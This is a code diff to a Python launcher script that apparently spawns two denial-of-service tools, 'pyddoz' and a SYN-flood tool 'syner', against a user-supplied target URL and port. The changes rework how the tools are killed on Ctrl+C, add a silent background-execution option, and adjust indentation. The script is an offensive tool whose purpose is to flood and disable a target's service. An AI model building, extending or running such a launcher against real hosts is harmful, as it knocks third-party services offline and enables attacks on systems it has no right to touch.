@@ -56,22 +56,22 @@ servToPort ={
   "wss": 443,
   "xmpp": 0
 }
+scripts = ["pyddoz", "syner"]
 
+pyddozPid = int
+synerPid = int
 def ctrlCHandler(sig, frame):
-    os.system('pkill ' + str(pyddozPid))
-    os.system('pkill ' + str(synerPid))
+    for script in scripts:
+        os.system('pkill -f ' + str(script))
     sys.exit(0)
 signal.signal(signal.SIGINT, ctrlCHandler)
 # print('Press Ctrl+C')
 
-pyddozPid = int
-synerPid = int
 def getCmdArgs(cmdDict):
     cmdArgsStr = ""
     for opt, value in cmdDict.items():
         print(str(opt)+ ' ' + str(value))
         cmdArgsStr += str(opt)+ ' ' + str(value)+ ' '
-    # cmdArgsStr += "&"
     print("execing : " + cmdArgsStr)
     return shlex.split(cmdArgsStr)
 
@@ -109,6 +109,7 @@ if __name__=="__main__":
             """)
     args_parser.add_argument('TARGET', help='target\'s url (including the protocol, http or https not optional)')
     args_parser.add_argument('-p', help='port number')
+    args_parser.add_argument('-s', help='silent, execution starts as background processes using &')
     args = args_parser.parse_args(sys.argv[1:])
     # Spawned the pyddoz on the target
     # Rip off the first protocol specifier
@@ -117,4 +118,4 @@ if __name__=="__main__":
     # Call syner to ddos using SYN flooding
     def_gw_device = netifaces.gateways()['default'][netifaces.AF_INET][1]
     synerPid = execSynFlood(URLProto, targetURLWOProto, def_gw_device)
-signal.pause()
+    signal.pause()
